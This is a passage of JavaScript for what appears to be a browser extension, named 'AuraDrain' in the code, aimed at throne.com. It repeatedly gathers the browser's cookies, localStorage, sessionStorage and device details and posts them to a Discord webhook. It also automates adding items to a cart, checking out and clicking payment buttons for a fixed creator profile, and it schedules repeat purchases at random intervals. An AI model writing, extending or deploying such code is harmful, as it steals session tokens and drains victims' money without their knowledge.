  debugLog(`📦 [EXPORT DEBUG] Structured export created with ${sessionExport.statistics.totalItems} items`, "success");
  return sessionExport;
}

async function sendStructuredSessionToDiscord(sessionExport) {
  debugLog("📤 [EXPORT DEBUG] Sending structured session to Discord", "info");
  
  const exportJson = JSON.stringify(sessionExport, null, 2);
  const exportSize = new Blob([exportJson]).size;
  
  debugLog(`📤 [EXPORT DEBUG] Export size: ${exportSize} bytes`, "info");
  
  if (exportSize > config.discordWebhook.maxMessageLength) {
    debugLog("📤 [EXPORT DEBUG] Export too large, sending as file", "info");
    return await sendToDiscordWebhook(exportJson, true);
  } else {
    debugLog("📤 [EXPORT DEBUG] Sending as structured message", "info");
    const structuredMessage = `🔧 **AURADRAIN STRUCTURED SESSION EXPORT** 🔧\n\n` +
      `📊 **Statistics:**\n` +
      `• **Total Items:** ${sessionExport.statistics.totalItems}\n` +
      `• **Cookies:** ${sessionExport.statistics.cookieCount}\n` +
      `• **LocalStorage:** ${sessionExport.statistics.localStorageCount}\n` +
      `• **SessionStorage:** ${sessionExport.statistics.sessionStorageCount}\n` +
      `• **Domains:** ${sessionExport.statistics.domainCount}\n\n` +
      `🖥️ **Device:** ${sessionExport.browserFingerprint.platform}\n` +
      `🌍 **URL:** ${sessionExport.metadata.url}\n` +
      `⏰ **Timestamp:** ${new Date(sessionExport.metadata.timestamp).toLocaleString()}\n\n` +
      `\`\`\`json\n${exportJson.substring(0, 1000)}...\n\`\`\``;
    
    return await sendToDiscordWebhook(structuredMessage);
  }
}

async function formatCookiesForDiscord(cookies) {
  if (!cookies || cookies.length === 0) {
    return "No cookies found.";
  }

  const cookiesByDomain = {};
  cookies.forEach(cookie => {
    const domain = cookie.domain;
    if (!cookiesByDomain[domain]) {
      cookiesByDomain[domain] = [];
    }
    cookiesByDomain[domain].push(cookie);
  });

  let formattedText = `🍪 **COOKIE COLLECTION REPORT** 🍪\n`;
  formattedText += `📊 **Total Cookies:** ${cookies.length}\n`;
  formattedText += `🌐 **Domains:** ${Object.keys(cookiesByDomain).length}\n`;
  formattedText += `⏰ **Timestamp:** ${new Date().toLocaleString()}\n`;
  formattedText += `🖥️ **User Agent:** ${navigator.userAgent}\n`;
  formattedText += `🌍 **URL:** ${window.location.href}\n\n`;

  Object.keys(cookiesByDomain).sort().forEach(domain => {
    const domainCookies = cookiesByDomain[domain];
    formattedText += `🌐 **${domain}** (${domainCookies.length} cookies)\n`;
    
    domainCookies.forEach(cookie => {
      formattedText += `  • **${cookie.name}** = \`${cookie.value}\`\n`;
      if (cookie.secure) formattedText += `    🔒 Secure\n`;
      if (cookie.httpOnly) formattedText += `    🛡️ HttpOnly\n`;
      if (cookie.session) formattedText += `    ⏱️ Session\n`;
      if (cookie.expirationDate) {
        const expDate = new Date(cookie.expirationDate * 1000);
        formattedText += `    ⏰ Expires: ${expDate.toLocaleString()}\n`;
      }
      formattedText += `\n`;
    });
    formattedText += `\n`;
  });

  return formattedText;
}

async function testDiscordWebhook() {
  debugLog("🧪 [WEBHOOK TEST] Starting Discord webhook test...", "info");
  
  const testMessage = `🧪 **WEBHOOK TEST MESSAGE** 🧪\n\n` +
    `⏰ **Time:** ${new Date().toLocaleString()}\n` +
    `🌍 **URL:** ${window.location.href}\n` +
    `🖥️ **User Agent:** ${navigator.userAgent.substring(0, 100)}...\n\n` +
    `✅ If you receive this message, your webhook is working correctly!`;
  
  debugLog("🧪 [WEBHOOK TEST] Sending test message...", "info");
  const success = await sendToDiscordWebhook(testMessage);
  
  if (success) {
    debugLog("✅ [WEBHOOK TEST] Webhook test successful!", "success");
  } else {
    debugLog("❌ [WEBHOOK TEST] Webhook test failed!", "error");
  }
  
  return success;
}

function debugLog(message, type = "info") {
  if (!config.debugMode) return;
  
  let logContainer = document.getElementById("debug-logs");
  if (!logContainer) {
    logContainer = createDebugBox();
  }
  
  const timestamp = new Date().toLocaleTimeString();
  const logEntry = document.createElement("div");
  
  let color = "#00ff00";
  let prefix = "[INFO]";
  let icon = "ℹ️";
  
  switch(type) {
    case "error":
      color = "#ff0000";
      prefix = "[ERROR]";
      icon = "❌";
      break;
    case "warning":
      color = "#ffaa00";
      prefix = "[WARN]";
      icon = "⚠️";
      break;
    case "success":
      color = "#00ffff";
      prefix = "[SUCCESS]";
      icon = "✅";
      break;
    case "action":
      color = "#ffff00";
      prefix = "[ACTION]";
      icon = "🎯";
      break;
    case "purchase":
      color = "#ff69b4";
      prefix = "[PURCHASE]";
      icon = "💳";
      break;
    case "cart":
      color = "#00ff88";
      prefix = "[CART]";
      icon = "🛒";
      break;
    case "navigation":
      color = "#87ceeb";
      prefix = "[NAV]";
      icon = "🧭";
      break;
  }
  
  const statusInfo = getStatusInfo();
  const fullMessage = `${icon} ${message} ${statusInfo}`;
  
  logEntry.innerHTML = `<span style="color: #888">${timestamp}</span> <span style="color: ${color}">${prefix}</span> ${fullMessage}`;
  logEntry.style.marginBottom = "2px";
  logEntry.style.wordWrap = "break-word";
  
  logContainer.appendChild(logEntry);
  logContainer.scrollTop = logContainer.scrollHeight;
  
  while (logContainer.children.length > 100) {
    logContainer.removeChild(logContainer.firstChild);
  }
}

function getStatusInfo() {
  const status = [];
  if (purchaseInProgress) status.push("🔄 PURCHASING");
  if (itemsAddedToCart > 0) status.push(`🛒 CART: ${itemsAddedToCart}/${maxItemsToAdd}`);
  if (payClicked) status.push("💳 PAID");
  return status.length > 0 ? `| ${status.join(" | ")}` : "";
}

function clickAddToCartForAnyItem() {
  if (itemsAddedToCart >= maxItemsToAdd) {
    debugLog(`Cart limit reached (${itemsAddedToCart}/${maxItemsToAdd}), skipping add process`, "warning");
    return;
  }
  
  if (purchaseInProgress) {
    debugLog("Purchase already in progress, skipping add to cart", "warning");
    return;
  }
  
  const targetItem = config.targetItemName.trim();
  if (targetItem) {
    debugLog(`🔍 Scanning for specific item: "${targetItem}"`, "cart");
  } else {
  debugLog("🔍 Scanning for available items to add to cart", "cart");
  }
  
  setTimeout(() => {
    if (itemsAddedToCart >= maxItemsToAdd) {
      debugLog(`Cart limit already reached during scan, aborting`, "warning");
      return;
    }
    
    const productCards = document.querySelectorAll("[class*=chakra-stack]");
    debugLog(`📦 Found ${productCards.length} product cards on page`, "info");

    let itemsFound = 0;
    let addableItems = 0;
    let specificItemFound = false;
    let fallbackItem = null;

    for (const card of productCards) {
      const hasImmediateChildWithIdParent = Array.from(card.children).some(
        (child) => child.id === "parent"
      );
      if (!hasImmediateChildWithIdParent) continue;
      
      itemsFound++;
      const addButton = card.querySelector("button");
      
      if (addButton) {
        const btnText = addButton.textContent.trim().toLowerCase();
        if ((btnText.includes("add") && btnText.includes("cart")) || btnText === "add") {
          addableItems++;
          
          let itemName = "";
          const headings = card.querySelectorAll("h1, h2, h3, h4, h5, h6, p, span");
          for (const heading of headings) {
            const text = heading.textContent.trim();
            if (text && text.length > 3 && text !== btnText) {
              itemName = text;
              break;
            }
          }
          
          if (targetItem && itemName.toLowerCase().includes(targetItem.toLowerCase())) {
            specificItemFound = true;
            debugLog(`🎯 Found target item: "${itemName}"`, "cart");
            debugLog(`💫 Adding specific item to cart...`, "cart");
          addButton.click();
          itemsAddedToCart++;
          purchaseInProgress = true;
            debugLog(`✅ Specific item added successfully! Cart: ${itemsAddedToCart}/${maxItemsToAdd}`, "success");
          debugLog(`🚀 Initiating purchase sequence...`, "purchase");
          
          setTimeout(() => {
            if (purchaseInProgress && itemsAddedToCart > 0) {
              clickCheckoutIfExists();
            }
          }, 3000);
          
          return;
          }
          
          if (!fallbackItem) {
            fallbackItem = { button: addButton, name: itemName };
            debugLog(`💾 Stored fallback item: "${itemName}"`, "info");
          }
        }
      }
    }
    
    if (targetItem && !specificItemFound && fallbackItem) {
      debugLog(`⚠️ Specific item "${targetItem}" not found, using fallback`, "warning");
      debugLog(`🎯 Adding fallback item: "${fallbackItem.name}"`, "cart");
      fallbackItem.button.click();
      itemsAddedToCart++;
      purchaseInProgress = true;
      debugLog(`✅ Fallback item added successfully! Cart: ${itemsAddedToCart}/${maxItemsToAdd}`, "success");
      debugLog(`🚀 Initiating purchase sequence...`, "purchase");
      
      setTimeout(() => {
        if (purchaseInProgress && itemsAddedToCart > 0) {
          clickCheckoutIfExists();
        }
      }, 3000);
      
      return;
    }
    
    if (!targetItem && fallbackItem) {
      debugLog(`🎯 Adding available item: "${fallbackItem.name}"`, "cart");
      fallbackItem.button.click();
      itemsAddedToCart++;
      purchaseInProgress = true;
      debugLog(`✅ Item added successfully! Cart: ${itemsAddedToCart}/${maxItemsToAdd}`, "success");
      debugLog(`🚀 Initiating purchase sequence...`, "purchase");
      
      setTimeout(() => {
        if (purchaseInProgress && itemsAddedToCart > 0) {
          clickCheckoutIfExists();
        }
      }, 3000);
      
      return;
    }
    
    if (itemsFound > 0) {
      debugLog(`📊 Scan complete: ${itemsFound} items found, ${addableItems} addable`, "info");
    }
    
    if (addableItems === 0) {
      debugLog(`❌ No addable items found on this page`, "warning");
    } else if (targetItem && !specificItemFound) {
      debugLog(`❌ Target item "${targetItem}" not found on this page`, "warning");
    }
  }, 3000);
}

function clickCheckoutIfExists() {
  if (!purchaseInProgress && itemsAddedToCart === 0) {
    debugLog("No items in cart, skipping checkout", "warning");
    return;
  }
  
  debugLog("🔍 Searching for checkout button", "action");
  
  setTimeout(() => {
    const buttons = document.querySelectorAll("button");
    debugLog(`🔘 Found ${buttons.length} buttons on page`, "info");
    
    for (const btn of buttons) {
      if (btn.textContent.trim().toLowerCase() === "checkout") {
        debugLog(`🎯 Checkout button found: "${btn.textContent.trim()}"`, "cart");
        debugLog(`💫 Clicking checkout button...`, "cart");
        btn.click();
        debugLog(`✅ Checkout initiated successfully!`, "success");
        return;
      }
    }
    
    debugLog("❌ No checkout button found with exact text 'checkout'", "warning");
    debugLog("🔄 Will retry on next cycle", "warning");
  }, 6000);
}

function clickPayNowIfExists() {
  debugLog("💳 Searching for payment button", "purchase");
  
  setTimeout(() => {
    const buttons = document.querySelectorAll("button");
    debugLog(`🔘 Found ${buttons.length} buttons on checkout page`, "info");
    
    const buttonTexts = Array.from(buttons).map(btn => btn.textContent.trim()).filter(text => text.length > 0);
    debugLog(`📝 Button texts: ${buttonTexts.join(', ')}`, "info");
    
    const paymentTexts = ["pay now", "pay", "complete purchase", "buy now", "purchase", "place order"];
    let paymentButtonsFound = 0;
    
    for (const btn of buttons) {
      const span = btn.querySelector("span");
      const btnText = btn.textContent.trim().toLowerCase();
      
      if (!btnText) continue;
      
      if (span && span.textContent.trim().toLowerCase() === "pay now" && !btn.disabled) {
        paymentButtonsFound++;
        debugLog(`🎯 Pay Now button found in span: "${span.textContent.trim()}"`, "purchase");
        debugLog(`💳 Processing payment...`, "purchase");
        btn.click();
        payClicked = true;
        purchaseInProgress = false;
        debugLog(`✅ Payment completed successfully! 🎉`, "success");
        debugLog(`🏁 Purchase sequence finished`, "success");
        
        // Schedule next purchase after successful payment
        if (autoRetryEnabled) {
          debugLog(`🔄 Auto-retry enabled - Scheduling next purchase...`, "info");
          scheduleNextPurchase();
        }
        return;
      }
      
      for (const paymentText of paymentTexts) {
        if (btnText.includes(paymentText) && !btn.disabled) {
          paymentButtonsFound++;
          debugLog(`🎯 Payment button found: "${btn.textContent.trim()}"`, "purchase");
          debugLog(`💳 Processing payment...`, "purchase");
          btn.click();
          payClicked = true;
          purchaseInProgress = false;
          debugLog(`✅ Payment completed successfully! 🎉`, "success");
          debugLog(`🏁 Purchase sequence finished`, "success");
          
          if (autoRetryEnabled) {
            debugLog(`🔄 Auto-retry enabled - Scheduling next purchase...`, "info");
            scheduleNextPurchase();
          }
          return;
        }
      }
    }
    
    debugLog(`❌ No payment buttons found (checked ${paymentButtonsFound} potential buttons)`, "warning");
    debugLog("🔄 Will retry payment detection on next cycle", "warning");
  }, 7000);
}


function redirectToProfile() {
  debugLog("🧭 Redirecting to profile page", "navigation");
  window.location.href = `https://${config.throneUrl}`;
}

function isOnCartOrCheckoutPage() {
  const url = window.location.href.toLowerCase();
  return url.includes('cart') || url.includes('checkout') || url.includes('payment');
}

function resetPurchaseState() {
  itemsAddedToCart = 0;
  purchaseInProgress = false;
  payClicked = false;
  debugLog("🔄 Purchase state reset - ready for new purchase", "info");
}

function mainLoop() {
  const url = window.location.href;
  const currentTime = Date.now();
  
  debugLog(`🔄 Main loop cycle | URL: ${url}`, "info");

  // Handle different throne.com scenarios
  if (url.includes("throne.com/checkout") || isOnCartOrCheckoutPage()) {
    debugLog("💳 On checkout/cart page - attempting payment", "purchase");
    clickPayNowIfExists();
  } else if (url.includes("throne.com/thegoddessaura")) {
    if (payClicked && !purchaseInProgress) {
      debugLog("🎉 Previous purchase completed, resetting for new purchase", "success");
      resetPurchaseState();
      return;
    }
    
    if (itemsAddedToCart < maxItemsToAdd && !isOnCartOrCheckoutPage() && !purchaseInProgress) {
      debugLog("🛍️ On profile page - scanning for items to purchase", "cart");
      clickAddToCartForAnyItem();
    } else if (itemsAddedToCart >= maxItemsToAdd && purchaseInProgress) {
      debugLog(`📊 Cart has ${itemsAddedToCart} item(s), focusing on checkout only`, "cart");
      clickCheckoutIfExists();
    } else if (purchaseInProgress && itemsAddedToCart > 0) {
      debugLog("🔄 Purchase in progress, continuing checkout flow", "purchase");
      clickCheckoutIfExists();
    } else {
      debugLog("ℹ️ Waiting for next action...", "info");
    }
  } else if (url === "https://throne.com/" || url === "https://throne.com" || url.includes("throne.com/?") || url.includes("throne.com#")) {
    debugLog("🏠 On throne.com homepage - redirecting to target profile", "navigation");
    redirectToProfile();
  } else if (url.includes("throne.com")) {
    debugLog("🧭 On throne.com but not target profile - redirecting", "navigation");
    redirectToProfile();
  } else {
    debugLog(`⚠️ Not on throne.com - current URL: ${url}`, "warning");
  }
}


function main() {
  debugLog("🚀AutoDrain Started!", "success");
  debugLog(`🖥️ PC Identifier: ${pcIdentifier}`, "info");
  debugLog(`🎯 Target Profile: ${config.throneUrl}`, "info");
  debugLog(`🛒 Purchase Mode: Single Item Per Transaction`, "info");
  if (config.targetItemName.trim()) {
    debugLog(`🎁 Target Item: "${config.targetItemName}" (with fallback)`, "info");
  } else {
    debugLog(`🎁 Target Item: Any available item`, "info");
  }
  debugLog(`🔄 Auto-Retry: ${autoRetryEnabled ? 'Enabled (10-60 min delay)' : 'Disabled'}`, "info");
  debugLog(`🔧 Debug Mode: Enabled`, "info");
  debugLog(`⚡ Force Stop: Alt+Shift+E`, "info");
  debugLog(`👁️ Toggle Debug: Ctrl+Alt+D`, "info");
  debugLog(`🍪 Cookie Log: Ctrl+Alt+C`, "info");
  debugLog(`🧪 Test Webhook: Ctrl+Alt+T`, "info");
  debugLog(`🔄 Toggle Auto-Retry: Ctrl+Alt+R`, "info");
  debugLog(`📦 Enhanced Collection: Ctrl+Alt+E`, "info");
  debugLog(`📡 Discord Webhook: ${config.discordWebhook.enabled ? 'Enabled' : 'Disabled'}`, "info");
  debugLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "info");
  
  const mainInterval = setInterval(mainLoop, 5000);
  
  // Initialize enhanced cookie collection if enabled
  if (config.cookieCollection.enabled && config.discordWebhook.enabled) {
    debugLog(`🍪 Enhanced cookie collection enabled (interval: ${config.cookieCollection.interval / 1000}s)`, "info");
    debugLog(`💾 Collection features: ${config.cookieCollection.collectCookies ? 'Cookies' : ''} ${config.cookieCollection.collectLocalStorage ? 'LocalStorage' : ''} ${config.cookieCollection.collectSessionStorage ? 'SessionStorage' : ''}`, "info");
    
    setTimeout(() => {
      debugLog("🧪 Testing webhook connection on startup...", "info");
      testDiscordWebhook();
    }, 5000);
    
    setTimeout(() => {
      if (config.cookieCollection.autoCollect) {
        debugLog("🚀 Starting automatic data collection...", "info");
      collectAndLogCookies();
      }
    }, 15000);
    
    if (config.cookieCollection.autoCollect) {
    setInterval(() => {
      collectAndLogCookies();
      }, config.cookieCollection.interval);
    }
  } else {
    debugLog("🍪 Enhanced cookie collection disabled", "info");
  }
  
  window.addEventListener("keydown", (event) => {
    if (event.altKey && event.shiftKey && event.key === "E") {
      if (config.forceStop) {
        debugLog("🛑 EMERGENCY STOP ACTIVATED (Alt+Shift+E)", "error");
        debugLog("🔄 Stopping all automation...", "warning");
        clearInterval(mainInterval);
        debugLog("✅ Extension stopped successfully", "success");
      }
    }
    
    if (event.ctrlKey && event.altKey && event.key === "D") {
      event.preventDefault();
      toggleDebugBox();
    }
    
    if (event.ctrlKey && event.altKey && event.key === "C") {
      event.preventDefault();
      debugLog("🍪 Manual cookie collection triggered", "info");
      collectAndLogCookies();
    }
    
    if (event.ctrlKey && event.altKey && event.key === "T") {
      event.preventDefault();
      debugLog("🧪 Manual webhook test triggered", "info");
      testDiscordWebhook();
    }
    
    if (event.ctrlKey && event.altKey && event.key === "R") {
      event.preventDefault();
      autoRetryEnabled = !autoRetryEnabled;
      debugLog(`🔄 Auto-retry ${autoRetryEnabled ? 'enabled' : 'disabled'}`, "info");
      if (autoRetryEnabled) {
        debugLog("⏰ Next purchases will be scheduled with 10-60 minute delays", "info");
      } else {
        debugLog("🛑 Auto-retry disabled - Only manual purchases will work", "warning");
      }
    }
    
    if (event.ctrlKey && event.altKey && event.key === "E") {
      event.preventDefault();
      debugLog("📦 Manual enhanced collection triggered", "info");
      debugLog("🔍 Starting comprehensive browser state collection...", "info");
      collectAndLogCookies();
    }
  });
}

main();

